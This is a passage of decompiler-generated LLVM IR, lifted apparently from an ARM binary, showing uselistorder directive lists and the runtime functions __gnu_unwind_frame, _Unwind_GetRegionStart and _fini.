150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 164, 165, 166, 24, 167, 168, 169, 196, 197, 198, 199, 200, 201, 202, 203, 204, 213, 211, 212, 214, 215, 216, 217, 218, 20, 219, 21, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 231, 230, 232, 233, 25, 236, 239, 237, 238, 240, 241, 242, 243, 245, 244, 246, 247, 248, 250, 249, 251, 252, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 4, 275, 272, 273, 274, 276, 277, 278, 279, 280, 289, 285, 286, 287, 288, 290, 291, 292, 293, 294, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 22, 410, 411, 412, 413, 414, 415, 416, 417, 23, 418, 419 }
  uselistorder i32* @lr, { 5, 0, 210, 211, 212, 213, 221, 214, 215, 216, 217, 3, 218, 219, 220, 222, 223, 224, 225, 226, 227, 229, 230, 8, 9, 231, 232, 233, 234, 235, 236, 237, 238, 239, 12, 13, 14, 15, 16, 17, 18, 19, 20, 10, 11, 21, 240, 241, 243, 244, 245, 250, 58, 59, 22, 23, 6, 248, 249, 139, 140, 141, 142, 143, 242, 246, 247, 144, 145, 146, 147, 148, 129, 130, 131, 149, 162, 163, 150, 151, 152, 153, 154, 155, 156, 4, 157, 158, 160, 161, 159, 119, 120, 164, 165, 97, 98, 166, 167, 168, 169, 48, 49, 50, 51, 52, 53, 170, 171, 228, 172, 132, 173, 24, 25, 7, 26, 27, 28, 1, 32, 33, 34, 35, 36, 37, 29, 30, 31, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 54, 55, 56, 57, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 99, 100, 101, 106, 102, 103, 104, 105, 107, 108, 109, 2, 110, 111, 112, 113, 114, 115, 116, 117, 118, 121, 122, 123, 124, 125, 126, 127, 128, 133, 134, 135, 136, 174, 175, 137, 138, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209 }
  uselistorder i32* @r6, { 498, 499, 500, 511, 501, 26, 502, 2, 503, 504, 3, 505, 506, 507, 508, 509, 510, 512, 0, 513, 514, 60, 61, 58, 59, 62, 515, 516, 4, 517, 518, 519, 520, 45, 46, 63, 5, 64, 65, 66, 67, 68, 21, 69, 70, 71, 6, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 43, 44, 47, 48, 49, 50, 7, 51, 52, 53, 8, 54, 55, 56, 57, 84, 27, 85, 22, 9, 10, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 361, 362, 363, 364, 523, 365, 11, 366, 367, 40, 12, 41, 13, 42, 521, 522, 368, 372, 373, 374, 375, 369, 370, 371, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 376, 401, 402, 403, 377, 378, 379, 380, 381, 14, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 397, 399, 393, 394, 395, 396, 398, 400, 97, 98, 1, 99, 306, 307, 404, 405, 406, 407, 408, 278, 279, 409, 410, 411, 412, 413, 28, 414, 415, 416, 417, 418, 100, 101, 102, 103, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 419, 420, 421, 422, 104, 105, 106, 107, 193, 15, 194, 195, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 34, 35, 36, 37, 32, 39, 38, 29, 30, 31, 33, 144, 145, 146, 147, 148, 149, 156, 157, 158, 159, 160, 150, 151, 152, 153, 154, 155, 308, 309, 310, 311, 161, 162, 163, 164, 165, 166, 167, 171, 168, 169, 170, 172, 16, 173, 174, 175, 176, 177, 178, 196, 197, 198, 199, 23, 200, 201, 202, 17, 203, 204, 205, 211, 206, 207, 208, 209, 210, 212, 213, 214, 215, 216, 217, 222, 218, 219, 220, 221, 223, 224, 225, 226, 227, 228, 234, 229, 230, 231, 232, 233, 235, 236, 237, 238, 239, 240, 241, 246, 242, 243, 244, 245, 247, 248, 249, 250, 251, 252, 253, 254, 259, 255, 256, 257, 258, 260, 261, 262, 263, 264, 265, 266, 267, 268, 273, 269, 270, 271, 272, 274, 275, 276, 277, 287, 280, 281, 282, 283, 284, 285, 286, 288, 289, 290, 291, 292, 293, 299, 294, 295, 296, 297, 298, 300, 301, 302, 303, 304, 305, 312, 313, 314, 320, 315, 316, 317, 318, 319, 321, 322, 323, 324, 325, 326, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 18, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 25, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 24, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 19, 20, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497 }
  uselistorder label %dec_label_pc_1a628, { 1, 0 }
  uselistorder label %dec_label_pc_1a5c4, { 1, 0 }
  uselistorder label %dec_label_pc_1a570, { 1, 0 }
  uselistorder label %dec_label_pc_1a548, { 1, 0 }
  uselistorder label %dec_label_pc_1a4b4, { 1, 0 }
  uselistorder label %dec_label_pc_1a498, { 1, 0 }
  uselistorder label %dec_label_pc_1a47c, { 1, 0 }
  uselistorder label %dec_label_pc_1a42c, { 1, 0 }
  uselistorder label %dec_label_pc_1a410, { 1, 0 }
  uselistorder label %dec_label_pc_1a38c, { 1, 0 }
  uselistorder label %dec_label_pc_1a370, { 1, 0 }
  uselistorder label %dec_label_pc_1a2ac, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_1a27c, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_1a264, { 1, 0 }
  uselistorder label %dec_label_pc_1a248, { 1, 0 }
  uselistorder label %dec_label_pc_19fac.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1a0d4, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1a0c8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a0bc, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_1a06c, { 1, 0 }
  uselistorder label %dec_label_pc_1a05c, { 1, 0 }
  uselistorder label %dec_label_pc_19fe8, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_1a6b0 = add i32 %ucbp, 76
  %v2_1a6b0 = inttoptr i32 %v1_1a6b0 to i32*
  %v3_1a6b0 = load i32, i32* %v2_1a6b0, align 4
  %v1_1a6b4 = add i32 %v3_1a6b0, 4
  %v2_1a6b4 = inttoptr i32 %v1_1a6b4 to i32*
  %v3_1a6b4 = load i32, i32* %v2_1a6b4, align 4
  %v3_1a6bc = mul i32 %v3_1a6b4, 256
  %v4_1a6c4 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_1a6bc, i32* %v4_1a6c4, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_1a6e4 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_1a6e4

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 278, 269, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 261, 270, 267, 47, 268, 48, 50, 49, 51, 260, 0, 265, 1, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 63, 64, 61, 65, 66, 271, 272, 67, 68, 69, 273, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 80, 79, 82, 263, 274, 264, 83, 84, 85, 86, 87, 89, 88, 90, 92, 91, 93, 275, 94, 95, 276, 106, 100, 96, 107, 101, 108, 102, 97, 98, 103, 104, 109, 105, 99, 110, 111, 112, 113, 114, 115, 116, 123, 120, 117, 124, 121, 125, 122, 118, 119, 126, 127, 128, 129, 140, 135, 141, 136, 142, 137, 143, 138, 130, 131, 132, 133, 144, 139, 134, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 161, 158, 162, 159, 163, 160, 155, 156, 157, 164, 165, 166, 167, 168, 178, 179, 173, 169, 180, 174, 181, 175, 170, 176, 182, 177, 171, 172, 183, 184, 185, 186, 187, 188, 193, 191, 189, 194, 192, 190, 195, 262, 277, 196, 198, 197, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 216, 223, 217, 224, 218, 219, 212, 213, 225, 220, 226, 221, 214, 215, 222, 227, 228, 229, 230, 231, 232, 237, 244, 238, 245, 239, 233, 234, 246, 240, 247, 241, 242, 235, 236, 243, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 266, 259 }
  uselistorder i32 4, { 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 116, 521, 522, 523, 524, 525, 3, 528, 529, 526, 527, 530, 4, 531, 532, 533, 534, 5, 551, 6, 535, 536, 537, 538, 539, 7, 540, 8, 541, 542, 543, 544, 545, 546, 547, 9, 548, 153, 549, 550, 552, 553, 554, 555, 10, 556, 11, 261, 262, 263, 264, 280, 281, 557, 242, 243, 437, 248, 265, 12, 13, 560, 14, 15, 103, 98, 99, 16, 561, 100, 562, 74, 17, 18, 101, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 19, 580, 581, 582, 583, 584, 585, 73, 586, 587, 588, 589, 590, 591, 20, 21, 102, 592, 273, 117, 271, 272, 266, 267, 268, 269, 270, 244, 245, 246, 247, 249, 250, 251, 252, 253, 254, 22, 255, 118, 256, 257, 258, 259, 260, 154, 274, 275, 276, 277, 278, 279, 23, 282, 283, 284, 285, 320, 321, 286, 287, 288, 593, 24, 155, 119, 156, 595, 25, 596, 157, 240, 241, 594, 90, 403, 404, 405, 406, 158, 75, 441, 442, 443, 444, 445, 446, 159, 160, 26, 447, 448, 449, 450, 451, 452, 453, 454, 161, 439, 440, 407, 408, 409, 410, 411, 412, 413, 414, 415, 27, 416, 417, 418, 455, 28, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 162, 163, 164, 470, 471, 474, 477, 472, 473, 120, 165, 475, 67, 476, 478, 479, 480, 482, 166, 30, 29, 481, 167, 168, 169, 289, 170, 68, 31, 32, 322, 323, 324, 325, 326, 33, 327, 76, 483, 484, 210, 34, 35, 558, 559, 211, 36, 37, 121, 290, 485, 77, 231, 122, 232, 38, 124, 233, 125, 234, 126, 235, 292, 293, 39, 294, 85, 86, 84, 295, 212, 213, 236, 237, 123, 218, 219, 220, 214, 215, 216, 217, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 238, 239, 70, 69, 296, 91, 297, 40, 298, 72, 71, 299, 41, 291, 300, 301, 306, 127, 307, 128, 309, 129, 310, 311, 308, 302, 130, 303, 304, 305, 312, 89, 88, 87, 313, 131, 42, 43, 44, 45, 46, 47, 314, 79, 78, 315, 80, 132, 316, 317, 318, 133, 319, 328, 171, 329, 330, 331, 332, 333, 172, 173, 134, 334, 48, 135, 335, 104, 336, 337, 174, 338, 339, 175, 176, 340, 136, 341, 105, 342, 343, 177, 178, 344, 179, 345, 346, 347, 180, 181, 348, 137, 349, 106, 350, 182, 183, 351, 352, 353, 138, 107, 354, 355, 184, 356, 357, 358, 185, 186, 0, 139, 359, 108, 360, 361, 362, 187, 363, 364, 188, 189, 1, 92, 365, 140, 366, 109, 367, 368, 369, 370, 190, 191, 371, 372, 373, 192, 374, 375, 141, 376, 2, 377, 110, 378, 142, 379, 380, 381, 193, 382, 383, 384, 385, 194, 195, 144, 386, 93, 387, 143, 388, 111, 389, 390, 391, 196, 392, 393, 394, 145, 395, 146, 396, 397, 398, 197, 198, 147, 399, 94, 400, 112, 401, 113, 402, 199, 49, 419, 200, 50, 420, 201, 51, 421, 202, 52, 422, 203, 95, 53, 423, 424, 204, 54, 425, 205, 55, 426, 206, 56, 427, 207, 57, 428, 208, 58, 429, 430, 209, 431, 432, 433, 434, 435, 436, 486, 438, 487, 488, 489, 114, 490, 96, 491, 492, 493, 494, 115, 495, 148, 496, 497, 498, 97, 499, 149, 500, 59, 60, 61, 62, 63, 501, 502, 503, 64, 83, 82, 81, 504, 65, 66, 150, 505, 151, 506, 507, 508, 152, 509, 510 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 708, 1288, 1289, 541, 1293, 1294, 1295, 1296, 580, 1297, 1298, 503, 521, 581, 1290, 1291, 1292, 1299, 542, 1300, 709, 99, 104, 102, 100, 105, 101, 103, 710, 711, 712, 713, 582, 583, 1301, 1302, 491, 716, 715, 714, 25, 27, 26, 28, 30, 29, 719, 718, 717, 114, 584, 585, 110, 1303, 51, 1304, 722, 721, 720, 357, 1305, 1306, 1307, 1308, 724, 723, 139, 141, 142, 140, 143, 66, 67, 496, 725, 375, 982, 726, 376, 377, 378, 727, 24, 983, 984, 985, 21, 20, 22, 23, 728, 36, 729, 325, 322, 323, 321, 324, 730, 549, 955, 262, 263, 261, 95, 94, 1309, 522, 586, 1310, 1, 0, 731, 318, 314, 312, 313, 319, 316, 317, 320, 315, 311, 587, 115, 732, 380, 381, 379, 504, 540, 505, 1166, 1167, 1168, 1169, 523, 733, 382, 735, 734, 383, 384, 961, 736, 986, 987, 988, 1312, 990, 989, 492, 737, 509, 991, 510, 1313, 957, 956, 1314, 511, 1315, 1316, 1317, 1318, 1319, 1320, 917, 1321, 1322, 1323, 1324, 1325, 1326, 918, 700, 739, 738, 461, 465, 467, 463, 462, 464, 466, 468, 470, 469, 995, 992, 993, 994, 537, 512, 88, 89, 91, 90, 588, 996, 997, 1012, 1013, 740, 701, 157, 158, 1004, 919, 1005, 1006, 920, 1007, 1008, 1009, 1010, 1011, 166, 160, 161, 163, 167, 164, 162, 165, 159, 168, 998, 999, 1000, 589, 1001, 1002, 1003, 741, 473, 477, 474, 471, 478, 472, 476, 475, 479, 1014, 1015, 1016, 742, 192, 191, 188, 187, 186, 193, 189, 190, 194, 1017, 1018, 1019, 1020, 743, 181, 182, 180, 184, 183, 185, 744, 213, 959, 590, 958, 538, 747, 746, 745, 386, 389, 385, 387, 394, 388, 393, 392, 390, 391, 591, 960, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 513, 748, 396, 395, 397, 400, 398, 399, 401, 973, 974, 975, 976, 977, 978, 979, 980, 981, 749, 12, 16, 18, 15, 13, 17, 14, 19, 592, 972, 750, 367, 1021, 1022, 1023, 1024, 1025, 593, 751, 370, 371, 373, 372, 374, 594, 144, 752, 151, 150, 147, 148, 149, 145, 146, 753, 118, 119, 126, 127, 122, 123, 124, 125, 120, 121, 754, 98, 96, 97, 755, 402, 756, 69, 68, 757, 57, 56, 758, 55, 54, 759, 1063, 45, 48, 46, 47, 403, 43, 44, 760, 38, 37, 761, 152, 762, 763, 116, 117, 1327, 1328, 1329, 595, 1330, 1331, 596, 1332, 766, 765, 764, 128, 130, 136, 129, 134, 133, 137, 135, 131, 132, 767, 65, 597, 768, 404, 405, 406, 138, 769, 413, 411, 412, 410, 407, 408, 409, 770, 33, 34, 32, 35, 31, 771, 772, 106, 774, 773, 343, 775, 111, 1171, 778, 777, 776, 70, 71, 779, 61, 63, 62, 64, 514, 780, 58, 487, 493, 1146, 781, 256, 253, 254, 255, 257, 258, 1147, 1148, 1149, 782, 415, 414, 420, 419, 416, 421, 418, 423, 417, 422, 424, 50, 497, 952, 953, 954, 783, 784, 1333, 524, 598, 786, 785, 787, 1172, 1175, 1176, 1177, 788, 425, 430, 431, 429, 428, 432, 426, 427, 1178, 1179, 1180, 1181, 789, 436, 442, 435, 441, 440, 434, 444, 443, 438, 433, 437, 439, 1173, 1174, 599, 289, 291, 290, 1150, 600, 1151, 1152, 1153, 1154, 1155, 790, 84, 85, 83, 86, 1182, 93, 92, 1183, 1184, 1185, 1186, 1187, 1188, 550, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 602, 1197, 1198, 1199, 1200, 1201, 601, 1202, 1203, 1204, 1205, 1206, 791, 447, 449, 445, 448, 453, 456, 452, 454, 455, 450, 451, 446, 42, 41, 603, 604, 501, 795, 794, 793, 792, 109, 87, 515, 107, 796, 40, 39, 797, 53, 52, 798, 49, 799, 457, 800, 801, 458, 802, 197, 803, 459, 804, 805, 460, 806, 221, 220, 807, 366, 365, 808, 272, 271, 809, 810, 482, 811, 276, 275, 812, 813, 483, 814, 1136, 1137, 81, 82, 922, 923, 924, 925, 926, 927, 928, 1334, 77, 78, 79, 80, 815, 1064, 605, 75, 76, 1026, 816, 278, 277, 606, 1065, 817, 259, 260, 607, 818, 74, 72, 73, 1066, 819, 155, 154, 153, 820, 821, 335, 334, 822, 156, 823, 480, 824, 113, 112, 825, 199, 198, 826, 273, 828, 827, 169, 170, 830, 829, 229, 230, 252, 1207, 488, 1208, 489, 1311, 265, 264, 1209, 1210, 1211, 1212, 495, 1213, 832, 831, 240, 248, 243, 246, 244, 245, 241, 242, 247, 490, 506, 1214, 1215, 1216, 1217, 11, 10, 2, 1218, 1219, 1220, 1221, 1222, 516, 1223, 517, 1224, 834, 833, 481, 1067, 1068, 1069, 1070, 835, 1225, 1226, 1227, 507, 525, 3, 494, 4, 1228, 1229, 1230, 1231, 608, 1232, 108, 1156, 231, 1234, 1233, 1235, 1236, 1027, 267, 1237, 836, 295, 294, 293, 292, 296, 1238, 837, 356, 355, 354, 353, 609, 947, 610, 948, 553, 949, 526, 621, 950, 1028, 552, 1029, 934, 527, 622, 623, 935, 930, 612, 929, 931, 932, 933, 615, 613, 502, 936, 614, 937, 938, 616, 939, 940, 619, 941, 942, 617, 943, 944, 618, 945, 946, 620, 951, 1030, 1031, 1032, 624, 1033, 1034, 1035, 625, 1036, 921, 1039, 1038, 611, 1037, 1040, 1041, 626, 1042, 1043, 1044, 1051, 1052, 498, 627, 702, 848, 847, 846, 845, 844, 843, 842, 703, 841, 840, 839, 838, 364, 361, 358, 363, 360, 362, 359, 1045, 1046, 628, 1047, 1048, 629, 1049, 1050, 301, 300, 299, 305, 302, 303, 304, 298, 297, 630, 631, 850, 849, 485, 486, 1138, 852, 851, 226, 227, 225, 224, 223, 222, 228, 634, 554, 1053, 1054, 555, 1055, 1056, 632, 633, 635, 1057, 1058, 636, 637, 638, 639, 640, 641, 642, 865, 864, 863, 862, 861, 860, 859, 858, 857, 856, 706, 855, 854, 853, 249, 251, 250, 643, 499, 644, 866, 647, 646, 645, 1059, 868, 867, 648, 649, 650, 1060, 1061, 651, 539, 652, 1062, 500, 653, 872, 871, 870, 869, 196, 195, 1071, 1077, 6, 528, 1072, 654, 1073, 5, 1074, 543, 1075, 529, 530, 1076, 1078, 1079, 544, 1080, 704, 876, 875, 705, 874, 873, 274, 1139, 556, 557, 1140, 7, 8, 9, 1081, 1082, 1083, 508, 545, 546, 1084, 1085, 1086, 1087, 1088, 656, 1089, 655, 1090, 657, 1091, 1092, 1093, 880, 879, 878, 877, 201, 202, 206, 204, 205, 200, 203, 207, 1094, 1095, 1096, 658, 659, 882, 881, 209, 211, 212, 208, 210, 1097, 1098, 660, 1099, 1100, 1101, 1102, 661, 1103, 662, 559, 558, 663, 1104, 883, 216, 217, 219, 218, 214, 215, 1105, 664, 1106, 562, 560, 561, 885, 884, 368, 369, 1107, 1108, 1109, 665, 1110, 666, 667, 1111, 563, 1112, 886, 233, 236, 237, 239, 238, 232, 235, 234, 1113, 1114, 1115, 668, 1116, 669, 565, 564, 670, 1117, 671, 1118, 887, 346, 349, 350, 352, 351, 344, 348, 347, 345, 1119, 1120, 1121, 1122, 1123, 1124, 672, 1125, 673, 1126, 674, 570, 569, 675, 1127, 566, 1128, 567, 1129, 568, 1130, 893, 892, 891, 890, 889, 888, 336, 339, 340, 342, 341, 337, 338, 1131, 1132, 1133, 676, 573, 572, 677, 1134, 571, 1135, 894, 327, 331, 332, 333, 326, 330, 329, 328, 1141, 1142, 1143, 678, 576, 575, 679, 1144, 574, 1145, 899, 898, 897, 896, 895, 172, 176, 177, 179, 178, 171, 175, 174, 173, 1157, 577, 680, 900, 269, 268, 270, 1158, 1159, 681, 1162, 682, 683, 1163, 1160, 1161, 1164, 1165, 310, 307, 308, 306, 309, 1239, 901, 266, 1170, 902, 60, 1240, 59, 1241, 689, 1242, 1243, 687, 1244, 688, 1245, 1246, 692, 1247, 1248, 548, 690, 1249, 691, 1250, 1251, 579, 1252, 1253, 533, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 519, 1261, 693, 1262, 694, 695, 1263, 1264, 1265, 1266, 534, 1267, 1268, 535, 1269, 1270, 536, 1271, 520, 532, 531, 1272, 1273, 686, 1274, 1275, 684, 1276, 518, 685, 578, 1277, 1279, 1280, 1278, 696, 1281, 697, 1282, 698, 1283, 1284, 916, 551, 1285, 1286, 547, 699, 1287, 913, 912, 911, 910, 707, 909, 908, 907, 906, 905, 904, 903, 281, 280, 284, 286, 282, 288, 287, 279, 283, 285, 914, 915, 484 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1a710 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1a718 = add i32 %tmp1, 72
  %v2_1a718 = inttoptr i32 %v1_1a718 to i32*
  %v3_1a718 = load i32, i32* %v2_1a718, align 4
  ret i32 %v3_1a718

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 176, 177, 178, 179, 14, 15, 62, 16, 180, 54, 11, 181, 182, 183, 184, 185, 187, 188, 186, 189, 190, 191, 192, 193, 194, 195, 17, 18, 19, 20, 22, 21, 23, 55, 56, 24, 25, 57, 58, 59, 60, 61, 63, 64, 89, 65, 66, 196, 5, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 3, 122, 123, 124, 125, 126, 26, 127, 145, 27, 28, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 164, 157, 158, 159, 160, 161, 162, 163, 165, 166, 29, 167, 4, 90, 91, 30, 92, 93, 94, 31, 67, 68, 50, 51, 40, 69, 70, 42, 52, 43, 44, 39, 41, 45, 46, 47, 48, 49, 53, 71, 72, 73, 6, 74, 75, 76, 77, 79, 80, 81, 32, 82, 33, 83, 34, 84, 35, 85, 36, 87, 88, 86, 78, 117, 95, 37, 96, 97, 98, 99, 100, 101, 102, 103, 38, 104, 105, 106, 12, 107, 108, 109, 110, 111, 112, 13, 113, 114, 115, 116, 118, 119, 120, 121, 0, 1, 2, 168, 169, 170, 171, 172, 174, 173, 175 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1a72c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1a72c)
  %v31_1a734 = load i32, i32* @r0, align 4
  ret i32 %v31_1a734

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 299, 300, 301, 16, 43, 80, 91, 302, 305, 306, 71, 17, 303, 304, 223, 46, 8, 307, 9, 18, 81, 0, 82, 10, 11, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 1, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 83, 42, 72, 73, 74, 75, 76, 77, 78, 79, 84, 85, 86, 87, 88, 89, 90, 19, 225, 20, 226, 21, 22, 23, 24, 178, 179, 334, 335, 337, 56, 57, 58, 59, 25, 196, 197, 2, 26, 27, 93, 94, 3, 28, 29, 338, 339, 4, 30, 31, 227, 228, 5, 32, 33, 69, 70, 336, 92, 229, 34, 53, 54, 230, 6, 231, 232, 233, 216, 52, 217, 218, 219, 55, 220, 221, 35, 241, 234, 235, 236, 237, 238, 239, 240, 95, 96, 36, 210, 37, 211, 242, 38, 243, 204, 39, 205, 244, 40, 245, 246, 41, 247, 97, 48, 98, 99, 49, 44, 180, 181, 182, 183, 248, 45, 249, 47, 250, 251, 252, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 62, 163, 60, 61, 63, 164, 166, 167, 168, 169, 170, 171, 165, 51, 12, 172, 173, 174, 175, 176, 177, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 212, 213, 7, 198, 199, 200, 201, 202, 203, 206, 207, 208, 209, 214, 215, 222, 224, 64, 65, 66, 253, 67, 254, 68, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 50 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 67, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 71, 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 27, 28, 72, 77, 78, 79, 80, 81, 82, 83, 73, 87, 88, 89, 90, 47, 48, 35, 36, 37, 38, 39, 40, 41, 42, 49, 74, 75, 76, 84, 85, 86, 50, 51, 52, 43, 44, 45, 53, 57, 58, 54, 55, 56, 91, 29, 30, 31, 32, 33, 34, 46, 59 }
  uselistorder i32 0, { 384, 383, 424, 425, 1373, 388, 387, 426, 1374, 1375, 1376, 1377, 331, 330, 427, 1378, 1379, 183, 1380, 1382, 1383, 131, 132, 1384, 1385, 1381, 74, 75, 76, 77, 2, 1, 3, 0, 172, 171, 173, 174, 175, 1386, 385, 386, 122, 118, 1387, 1388, 177, 178, 176, 179, 1389, 1390, 1391, 1392, 182, 181, 180, 1393, 1394, 1395, 374, 373, 428, 389, 429, 390, 430, 391, 431, 432, 433, 133, 1396, 405, 404, 1397, 1398, 403, 402, 1399, 434, 400, 401, 398, 399, 397, 396, 1400, 395, 394, 393, 392, 345, 1401, 1417, 1402, 186, 1403, 1404, 1405, 1406, 1407, 1408, 188, 1410, 1411, 184, 185, 1412, 1413, 111, 134, 1414, 1415, 636, 78, 79, 375, 376, 187, 1409, 1416, 344, 1418, 435, 436, 1419, 407, 406, 189, 1420, 1421, 190, 1422, 1423, 1424, 90, 437, 438, 1425, 191, 1426, 135, 1427, 1428, 192, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 36, 112, 439, 1439, 193, 1440, 1441, 1442, 4, 1443, 1444, 5, 1445, 1446, 874, 875, 6, 123, 1447, 440, 1448, 788, 789, 790, 791, 792, 796, 793, 794, 795, 7, 346, 80, 797, 441, 798, 799, 800, 408, 409, 876, 877, 8, 442, 733, 443, 1449, 1450, 1451, 9, 10, 136, 137, 138, 1466, 1467, 11, 734, 139, 140, 1161, 1162, 1163, 1164, 194, 195, 1165, 743, 196, 113, 46, 1468, 81, 347, 1472, 1473, 47, 801, 91, 802, 803, 804, 348, 141, 1469, 1470, 1471, 349, 12, 1474, 1475, 1476, 1477, 1478, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1479, 1480, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 37, 1499, 1500, 1501, 1502, 1503, 38, 1504, 1505, 1506, 39, 1507, 1508, 1509, 40, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1534, 1535, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 41, 1553, 1554, 